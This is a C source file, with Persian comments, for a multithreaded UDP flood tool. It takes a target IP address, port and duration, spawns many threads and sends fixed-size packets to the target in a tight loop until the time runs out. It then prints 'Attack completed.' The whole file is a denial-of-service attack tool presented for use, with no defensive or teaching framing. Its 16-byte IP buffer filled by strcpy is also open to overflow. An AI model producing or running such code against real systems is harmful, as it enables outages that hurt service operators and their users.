#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

#define THREAD_COUNT 999999     // افزایش تعداد رشته‌ها
#define PACKET_SIZE 9999        // اندازه بسته کوچک‌تر
#define BATCH_SIZE 999999     // افزایش تعداد بسته‌ها در هر حلقه

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
} attack_info;

// ارسال بسته‌ها با حداکثر سرعت
void *udp_flood(void *arg) {
    attack_info *info = (attack_info *)arg;

    // ایجاد سوکت UDP
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Error creating socket");
        pthread_exit(NULL);
    }

    // تنظیم آدرس هدف
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(info->target_port);
    inet_pton(AF_INET, info->target_ip, &target.sin_addr);

    // ساخت بسته
    char packet[PACKET_SIZE];
    memset(packet, 0x41, PACKET_SIZE); // پر کردن بسته با داده ثابت

    // تعیین زمان پایان
    time_t end_time = time(NULL) + info->duration;

    while (time(NULL) < end_time) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        return EXIT_FAILURE;
    }

    attack_info info;
    strcpy(info.target_ip, argv[1]);
    info.target_port = atoi(argv[2]);
    info.duration = atoi(argv[3]);

    pthread_t threads[THREAD_COUNT];

    // ایجاد رشته‌ها
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, udp_flood, &info) != 0) {
            perror("Failed to create thread");
        }
    }

    // انتظار برای پایان رشته‌ها
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack completed.\n");
    return EXIT_SUCCESS;
}
